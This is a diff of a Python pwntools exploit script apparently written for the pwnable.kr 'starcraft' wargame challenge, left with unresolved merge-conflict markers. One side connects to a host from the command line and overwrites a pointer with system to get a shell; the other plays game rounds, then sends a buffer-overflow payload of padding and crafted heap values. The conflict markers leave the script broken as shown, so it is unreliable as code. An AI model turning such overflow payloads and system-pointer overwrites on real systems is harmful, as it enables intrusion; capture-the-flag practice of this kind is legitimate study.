@@ -19,6 +19,7 @@ libc = ""
 env = ""
 LOCAL = 1
 
+<<<<<<< HEAD
 #p = remote("172.16.5.60", 5073)
 p = remote(sys.argv[1], 5073)
 
@@ -143,4 +144,41 @@ update_profile(p64(system), 80, "aaaa", shell=True)
 
 
 
+=======
+#p = process("./starcraft")
+p = remote("pwnable.kr", 9020)
+
+p.recvuntil("Ultralisk\n")
+
+#choose templar
+
+p.sendline("6")
+p.recvuntil("strom) \n")
+
+#change to arcon
+p.sendline("1")
+p.recvuntil("default) \n")
+
+#start attack!
+
+count = 0
+while 1:
+    #round
+    p.sendline("0")
+    data = p.recvuntil("default) \n")
+    if "Stage" in data:
+        count += 1
+    if count == 11:
+        
+        #finish!
+        break
+
+p.sendline("1")
+p.recvuntil("work : \n")
+
+p.sendline("a" * 0x110 + p64(0x87) + p64(0x31) + p64(0x140) + p64(0x140))
+
+data = p.recv()
+print data
+>>>>>>> 93d2327b1101101f815a6e869f0c631ba52097f6
 
